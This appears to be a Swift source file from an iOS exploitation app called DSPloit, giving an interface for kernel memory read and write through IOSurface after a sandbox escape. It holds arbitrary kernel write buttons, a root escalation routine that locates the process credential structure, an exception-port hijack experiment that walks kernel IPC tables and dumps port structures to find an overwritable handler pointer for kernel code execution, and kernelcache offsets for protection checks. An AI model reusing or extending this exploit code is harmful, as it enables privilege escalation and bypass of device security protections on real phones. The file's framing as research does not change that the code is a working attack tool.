//
//  BleedingEdgeIOSurfaceKRW.swift
//  DSPloit
//
//  IOSurface KRW Research & Exploitation View
//  Created by Royan
//

import SwiftUI

struct BleedingEdgeIOSurfaceKRWView: View {
    @ObservedObject private var engine = IOSurfaceKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var resultMsg = ""
    @State private var gxfReport = ""
    @State private var dmaReport = ""
    @State private var readAddr = ""
    @State private var readResult = ""
    @State private var writeAddr = ""
    @State private var writeVal = ""
    @State private var writeResult = ""
    @State private var rootResult = ""
    
    var body: some View {
        List {
            // Status
            Section(header: HeaderLabel(text: "IOSurface KRW Status", icon: "cpu")) {
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.isReady, label: "IOSurface")
                }
                
                if engine.surfaceID != 0 {
                    VStack(alignment: .leading, spacing: 4) {
                        InfoRow(label: "Surface ID", value: "\(engine.surfaceID)", color: .cyan)
                        InfoRow(label: "Mapped Addr", value: String(format: "0x%llx", engine.mappedAddress), color: .green)
                    }
                }
            }
            
            // Initialize
            Section(header: HeaderLabel(text: "Initialize", icon: "bolt.fill")) {
                Button(action: {
                    let result = engine.openIOSurfaceRoot()
                    resultMsg = result.message
                }) {
                    HStack {
                        Image(systemName: "play.circle.fill")
                        Text("Open IOSurfaceRoot")
                        Spacer()
                        if engine.isReady {
                            Image(systemName: "checkmark.circle.fill")
                                .foregroundStyle(.green)
                        }
                    }
                }
                .disabled(!mgr.dsready || !mgr.sbxready)
                
                if !mgr.sbxready {
                    PlainAlert(
                        title: "Requires Sandbox Escape",
                        icon: "lock.fill",
                        text: "Run sandbox escape first (Main tab → Initialize System)",
                        color: .orange
                    )
                }
            }
            
            // Quick Address Buttons (tap to copy or auto-fill)
            Section(header: HeaderLabel(text: "Quick Addresses (tap to paste)", icon: "doc.on.clipboard")) {
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernbase)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_base")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernbase))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.cyan)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernslide)
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_slide")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernslide))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.orange)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let proc = ds_get_our_proc()
                    let addr = String(format: "0x%llx", proc)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_proc")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_proc()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let task = ds_get_our_task()
                    let addr = String(format: "0x%llx", task)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_task")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_task()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
            }
            
            // Read Test
            Section(header: HeaderLabel(text: "Memory Read (via IOSurface)", icon: "magnifyingglass")) {
                TextField("Address (hex)", text: $readAddr)
                    .font(.system(.body, design: .monospaced))
                
                Button("Read 8 bytes") {
                    guard let addr = UInt64(readAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    let val = engine.propertyRead(address: addr)
                    readResult = String(format: "0x%llx = 0x%016llx", addr, val)
                }
                .disabled(!mgr.dsready)
                
                if !readResult.isEmpty {
                    Text(readResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            }
            
            // Write Test
            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
                TextField("Write Address (hex)", text: $writeAddr)
                    .font(.system(.body, design: .monospaced))
                TextField("Value (hex)", text: $writeVal)
                    .font(.system(.body, design: .monospaced))
                
                Button("Write 8 bytes") {
                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    engine.propertyWrite(address: addr, value: val)
                    // Read back to verify
                    let readBack = engine.propertyRead(address: addr)
                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
                                        val, addr, readBack,
                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
                }
                .disabled(!mgr.dsready)
                .foregroundStyle(.red)
                
                if !writeResult.isEmpty {
                    Text(writeResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // One-tap Root Attempt
            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
                Button(action: attemptRoot) {
                    HStack {
                        Image(systemName: "person.badge.key.fill")
                        Text("Attempt uid=0 (Root)")
                        Spacer()
                        Image(systemName: "exclamationmark.triangle.fill")
                            .foregroundStyle(.orange)
                    }
                    .foregroundStyle(.red)
                }
                .disabled(!mgr.dsready)
                
                if !rootResult.isEmpty {
                    Text(rootResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
                        .textSelection(.enabled)
                }
                
                Text("Writes uid=0 to ucred. PPL may block this.")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
            }
            
            // Research: GXF Entry
            Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                Button("Generate GXF Report") {
                    gxfReport = engine.researchGXFEntry()
                }
                
                if !gxfReport.isEmpty {
                    Text(gxfReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            }
            
            // Research: DMA Bypass
            Section(header: HeaderLabel(text: "DMA PPL Bypass Research", icon: "bolt.shield")) {
                Button("Generate DMA Report") {
                    dmaReport = engine.researchDMABypass()
                }
                
                if !dmaReport.isEmpty {
                    Text(dmaReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            }
            
            // Kernelcache Analysis Results
            Section(header: HeaderLabel(text: "Kernelcache Findings", icon: "doc.text.magnifyingglass")) {
                VStack(alignment: .leading, spacing: 6) {
                    Text("From deep_analyze_v3.py:")
                        .font(.caption.bold())
                    
                    InfoRow(label: "IOSurface strings", value: "762", color: .cyan)
                    InfoRow(label: "PPL checks (bit#14)", value: "223", color: .red)
                    InfoRow(label: "GXF accesses", value: "50", color: .orange)
                    InfoRow(label: "pmap functions", value: "7 with PPL checks", color: .purple)
                    
                    Text("\nKey addresses (file offsets):")
                        .font(.caption.bold())
                    
                    Group {
                        Text("GXF handler: 0xf0c440")
                        Text("PPL check #1: 0xe33e14")
                        Text("pmap_enter: 0x11126c0 (667 branches)")
                        Text("IOSurfaceRoot: 0x0067d03b (string)")
                        Text("Largest func: 0x155e280 (106KB)")
                    }
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundStyle(.green)
                }
            }
            
            // Result
            if !resultMsg.isEmpty {
                Section(header: HeaderLabel(text: "Result", icon: "info.circle")) {
                    Text(resultMsg)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(engine.isReady ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section(header: HeaderLabel(text: "Log", icon: "terminal")) {
                    ForEach(engine.statusLog.suffix(20), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }
        }
        .navigationTitle("IOSurface KRW")
        .premiumStyling()
    }
    
    private func attemptRoot() {
        guard mgr.dsready else {
            rootResult = "Kernel not ready"
            return
        }
        
        let proc = ds_get_our_proc()
        guard proc != 0 else { rootResult = "proc = 0"; return }
        let task = ds_get_our_task()
        guard task != 0 else { rootResult = "task = 0"; return }
        
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        let origUid = ds_kread32(ucred + 0x18)
        
        var report = ""
        report += String(format: "proc:     0x%llx\n", proc)
        report += String(format: "task:     0x%llx\n", task)
        report += String(format: "proc_ro:  0x%llx\n", procRo)
        report += String(format: "ucred:    0x%llx\n", ucred)
        report += String(format: "orig uid: %d\n\n", origUid)
        
        // ============================================================
        // EXPERIMENT: Exception Port Hijack for Kernel Code Execution
        //
        // Theory:
        // 1. Set exception port on our thread/task
        // 2. Exception port is a mach port → has a kernel ipc_port object
        // 3. ipc_port has ip_kobject field (for kernel-handled ports)
        // 4. When exception fires, kernel calls handler via port
        // 5. If we can redirect the handler → kernel code execution
        //
        // Step 1 (this build): DISCOVERY
        // - Set exception port
        // - Find the port's kernel address via task→itk_space→is_table
        // - Dump port structure
        // - Identify what we can overwrite
        // ============================================================
        
        report += "=== EXCEPTION PORT EXPERIMENT ===\n\n"
        
        // Step 1: Allocate a mach port for exception handling
        var excPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &excPort)
        guard kr == KERN_SUCCESS else {
            report += String(format: "mach_port_allocate failed: %d\n", kr)
            rootResult = report
            return
        }
        
        kr = mach_port_insert_right(mach_task_self(), excPort, excPort, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
        guard kr == KERN_SUCCESS else {
            report += String(format: "mach_port_insert_right failed: %d\n", kr)
            rootResult = report
            return
        }
        
        report += String(format: "Exception port allocated: 0x%x\n", excPort)
        
        // Step 2: Set as task exception port
        kr = task_set_exception_ports(
            mach_task_self(),
            exception_mask_t(EXC_MASK_ALL),
            excPort,
            Int32(EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES),
            ARM_THREAD_STATE64
        )
        report += String(format: "task_set_exception_ports: %d (%@)\n\n", kr, kr == KERN_SUCCESS ? "OK" : "FAIL")
        
        // Step 3: Find port's kernel address
        // Port name (excPort) maps to entry in itk_space→is_table
        // Entry index = port name >> 8 (on iOS)
        let portIndex = UInt64(excPort) >> 8
        report += String(format: "Port index: %d (name=0x%x >> 8)\n", portIndex, excPort)
        
        // Read itk_space and is_table
        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
        report += String(format: "itk_space: 0x%llx\n", itkSpace)
        
        // is_table pointer — try reading it
        let isTableRaw = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
        report += String(format: "is_table (raw): 0x%llx\n", isTableRaw)
        
        // Try with PAC mask
        let isTable = isTableRaw | pac_mask
        report += String(format: "is_table (stripped): 0x%llx\n\n", isTable)
        
        // Step 4: Read our port's entry
        let entrySize = UInt64(sizeof_ipc_entry)
        let entryAddr = isTable + portIndex * entrySize
        report += String(format: "Entry addr: 0x%llx (idx=%d, size=%d)\n", entryAddr, portIndex, entrySize)
        
        // Read ie_object (port pointer) — use safe read
        let ieObject = ds_kread64_safe(entryAddr + UInt64(off_ipc_entry_ie_object))
        report += String(format: "ie_object (raw): 0x%llx\n", ieObject)
        
        if ieObject == 0 {
            report += "ie_object is 0 — port entry not found at this index.\n"
            report += "Port name encoding may differ on iOS 18.\n"
            mach_port_deallocate(mach_task_self(), excPort)
            rootResult = report
            return
        }
        
        let portKaddr = ieObject | pac_mask
        report += String(format: "Port kaddr: 0x%llx\n\n", portKaddr)
        
        // Step 5: Dump port structure (if accessible)
        if ds_isvalid(portKaddr) {
            report += "=== PORT STRUCT DUMP ===\n"
            for i in stride(from: 0, to: 0x80, by: 8) {
                let val = ds_kread64_safe(portKaddr + UInt64(i))
                var note = ""
                if i == Int(off_ipc_port_ip_kobject) { note = " ← ip_kobject" }
                report += String(format: "  port+0x%02x: 0x%016llx%@\n", i, val, note)
            }
            
            report += "\n=== ANALYSIS ===\n"
            report += "If we can overwrite ip_kobject or handler pointer,\n"
            report += "triggering an exception will call our controlled address\n"
            report += "in KERNEL context → kernel code execution → root.\n"
            report += "\nNext: test if port struct fields are writable.\n"
        } else {
            report += "Port kaddr not accessible via socket KRW.\n"
            report += "Port may be in different zone.\n"
        }
        
        // Cleanup
        mach_port_deallocate(mach_task_self(), excPort)
        
        report += "\n=== DONE ===\n"
        rootResult = report
    }
}
